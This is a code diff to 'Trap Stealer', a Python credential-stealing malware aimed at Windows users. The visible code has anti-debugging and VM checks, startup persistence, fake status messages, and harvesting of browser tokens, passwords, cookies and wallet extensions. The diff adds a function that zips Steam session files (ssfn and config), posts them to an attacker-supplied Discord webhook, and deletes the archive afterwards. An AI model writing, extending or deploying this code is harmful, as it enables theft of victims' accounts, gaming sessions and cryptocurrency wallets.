@@ -23,7 +23,8 @@ from os.path import isfile, join
 import winreg
 
 
-
+import os, os.path, zipfile, requests
+from config import hook
 ### CONFIG ### 
 webhook = '' #Put ur webhook
 
@@ -32,7 +33,6 @@ Startup = True # If True it will add the file into the startup folder
 shitty_message = True # If True it will print fake message, if you want to disable it replace with False
 antidebugging = True # If set to false it will dont check for VM or Debugger
 StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
-
 
 def antidebug():
     checks = [check_windows, check_ip, check_registry, check_dll]
@@ -495,8 +495,7 @@ if shitty_message == True:
     print('Everything Installed...')
 else:
     pass
-def GatherAll():
-    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
+def GetAll():
     browserPaths = [
         [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
         [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
@@ -527,8 +526,10 @@ def GatherAll():
         a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
         a.start()
 
-GatherAll()
-
+try:
+    GetAll()
+except:
+    pass
 
 data = {
     "username": "Trap Stealer",
@@ -622,6 +623,65 @@ LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 user = os.path.expanduser("~")
 
+import shutil
+
+def steam_st():
+    steam_path = ""
+    if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
+        steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
+        ssfn = []
+        config = ""
+        for file in os.listdir(steam_path):
+            if file[:4] == "ssfn":
+                ssfn.append(steam_path+f"\\{file}")
+        def steam(path,path1,steam_session):
+            for root,dirs,file_name in os.walk(path):
+                for file in file_name:
+                    steam_session.write(root+"\\"+file)
+            for file2 in path1:
+                steam_session.write(file2)
+        if os.path.exists(steam_path+"\\config"):
+            with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
+                steam(steam_path+"\\config",ssfn,zp)
+        # First request with embed
+        data = {
+            "username": "Trap Stealer",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "embeds": [
+                {
+                    "title": "🎮 Trap Stealer Steam Session",
+                    "description": f"Steam session taken at : {time.strftime('%Y-%m-%d %H:%M:%S')}\n",
+                    "color": 0xffb6c1,
+                    "thumbnail": {
+                        "url": "https://cdn.icon-icons.com/icons2/2107/PNG/512/filetype_ico_icon_130108.png"
+                    },
+                    "footer": {
+                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    }
+                }
+            ]
+        }
+        response = requests.post(webhook, json=data)
+        # Second request with file
+        file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
+        data = {
+            "username": "Trap Stealer",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
+        }
+        response = requests.post(webhook, files=file, data=data)
+        try:
+            os.remove(f"{os.environ['TEMP']}\steam_session.zip")
+        except:
+            pass
+
+
+try:
+    steam_st()
+except:
+    pass
+
+
 def screen():
 
     img = ImageGrab.grab()
@@ -660,6 +720,9 @@ def screen():
         os.remove(img_path)
     except:
         pass
+
+
+
 if shitty_message == True:
     print('Starting..')
 else:
